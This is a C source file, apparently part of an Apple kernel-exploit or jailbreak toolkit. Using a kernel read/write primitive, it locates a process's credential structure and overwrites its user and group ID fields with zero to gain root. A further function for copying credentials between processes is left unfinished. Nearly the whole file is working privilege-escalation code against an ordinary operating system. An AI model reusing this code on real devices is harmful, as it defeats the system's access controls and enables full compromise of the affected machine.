#include "../include/tools.h"
#include "../include/kernel.h"

//  a bit memory inefficient but I prefer this as it's more readable
addr64_t read_pointer(krw_handlers *toolbox, addr64_t ptr_addr)
{
    addr64_t ptr;
    return toolbox->kread(ptr_addr, &ptr, sizeof(addr64_t)) ? 0 : STRIP_PAC(ptr);
}

int safe_elevate(krw_handlers *toolbox, pid_t pid)
{
    addr64_t ucred_s = read_pointer(toolbox, find_pid(toolbox, pid) + __ucredOffset);

    if (!ucred_s)
    {
        printf("Failed to read my ucred struct\n");
        return 1;
    }

    uint32_t root = 0;

    // set group and user id to 0
    // apparently nullifying all the other kern struct variables isn't required
    if (toolbox->kwrite(&root, ucred_s + __cr_uid, sizeof(uint32_t)) ||
        toolbox->kwrite(&root, ucred_s + __cr_ruid, sizeof(uint32_t)) ||
        toolbox->kwrite(&root, ucred_s + __cr_rgid, sizeof(uint32_t)) ||
        toolbox->kwrite(&root, ucred_s + __cr_svgid, sizeof(uint32_t)) ||
        toolbox->kwrite(&root, ucred_s + __cr_svuid, sizeof(uint32_t)))
    {
        printf("Ucred writing failed!");
        return 1;
    }

    if (getuid() != 0) // apparently this just works after nulling __cs_svuid??
    {
        printf("Elevation failed :( UID: %d\n", getuid());
        return 1;
    }

    return 0;
}

int copy_ucred(krw_handlers *toolbox, pid_t from, pid_t to)
{
    addr64_t from_ucred = read_pointer(toolbox, find_pid(toolbox, from) + __ucredOffset);
    addr64_t to_ucred = read_pointer(toolbox, find_pid(toolbox, to) + __ucredOffset);

    if (!from_ucred || !to_ucred)
    {
        printf("Failed to find from/to ucreds\n");
        return 1;
    }

    struct ucred key = {0};
    if (toolbox->kread(from_ucred + __cr_uid, &key.cr_posix, sizeof(struct posix_cred)))
    {
        printf("Failed to read posix_cred\n");
        return 0;
    }

    if (toolbox->kread(from_ucred + __cr_audit, &key.cr_audit, sizeof(struct au_session)))
    {
        printf("Failed to read au_session\n");
        return 0;
    }
    key.cr_posix.cr_ngroups = 3;

    /*
         todo: https://twitter.com/xina520/status/1515720109255393282
        https://github.com/apple/darwin-xnu/blob/main/bsd/sys/ucred.h#L89
        */
}